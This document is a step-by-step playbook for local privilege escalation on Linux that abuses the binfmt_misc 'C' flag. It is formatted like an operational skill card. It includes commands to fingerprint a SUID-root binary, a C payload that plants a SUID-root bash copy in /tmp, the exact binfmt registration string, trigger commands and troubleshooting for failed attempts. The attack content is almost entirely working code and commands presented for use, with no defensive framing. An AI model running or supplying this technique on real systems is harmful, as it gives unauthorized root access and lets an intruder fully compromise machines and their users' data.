# binfmt_misc `C`-flag SUID Laundering

## When this applies

- You can write to `/proc/sys/fs/binfmt_misc/register` — this means: root, `CAP_SYS_ADMIN`, OR any binary with `cap_dac_override` that opens that path.
- An existing SUID-root binary is present (`/usr/bin/su`, `sudo`, `passwd`, `mount`, ...).
- Goal: launder root credentials out of an existing SUID-root binary via the kernel's binfmt_misc `C` flag.

## Technique

The kernel's `C` flag tells binfmt_misc to invoke the registered interpreter with the **credentials of the matched binary**, not those of the caller. Register a malicious ELF interpreter matching the SUID binary's first bytes — when anyone exec's the SUID binary, kernel runs your interpreter as root.

## Steps

```bash
# 1. Pick a SUID-root binary with a unique ELF prefix (e_entry low bytes differ
#    between /usr/bin/su, sudo, passwd, mount, ...). Grab its first ~26 bytes:
xxd -l 32 /usr/bin/su

# 2. Compile a real ELF interpreter (NOT a #! script — `C` implies `O`,
#    incompatible with binfmt_script). Minimal payload:
cat > /tmp/p.c <<'EOF'
#include <stdlib.h>
int main(void){ system("cp /bin/bash /tmp/rb;chown root:root /tmp/rb;chmod 6755 /tmp/rb"); return 0; }
EOF
gcc -o /tmp/payload /tmp/p.c

# 3. Register. Format `:NAME:M::magic:mask:interpreter:flags` — single colon
#    between magic and mask. Magic/mask are unescaped by the kernel, so \xNN
#    works inside echo. Mask must equal magic length (here 26 bytes of \xff).
REG=':PWN:M::\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x3e\x00\x01\x00\x00\x00\xd0\x38:\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff:/tmp/payload:C'
echo "$REG" > /proc/sys/fs/binfmt_misc/register   # or pipe through the cap_dac_override binary

# 4. Trigger by exec'ing the SUID binary. Kernel runs /tmp/payload as root.
/usr/bin/su nobody -c true
/tmp/rb -p   # SUID-root bash
```

## Verifying success

- `/tmp/rb -p` returns a SUID-root shell.
- `id` reports `euid=0(root)`.

## Diagnosing failures

- `write: Invalid argument` → format error. Most common: extra colon between magic and mask, or mask length ≠ magic length.
- `cannot execute binary file: Exec format error` → interpreter is a shell script. Recompile as ELF.
- `cannot execute binary file: Exec format error` on the SUID binary itself but no message about the interpreter → the magic/mask matched something it shouldn't (e.g. all ELFs). Tighten the magic so it matches only the target SUID binary.

To delete a registered entry: `echo -1 > /proc/sys/fs/binfmt_misc/<NAME>`.

## Common pitfalls

- The interpreter MUST be a real ELF binary — `#!`-script interpreters fail because `C` implies `O` (no script).
- Mask length must equal magic length exactly.
- Tighten magic to match ONLY the target SUID binary, not all ELFs (otherwise non-SUID ELFs trigger the laundering and break unrelated commands).

## Tools

- gcc
- xxd
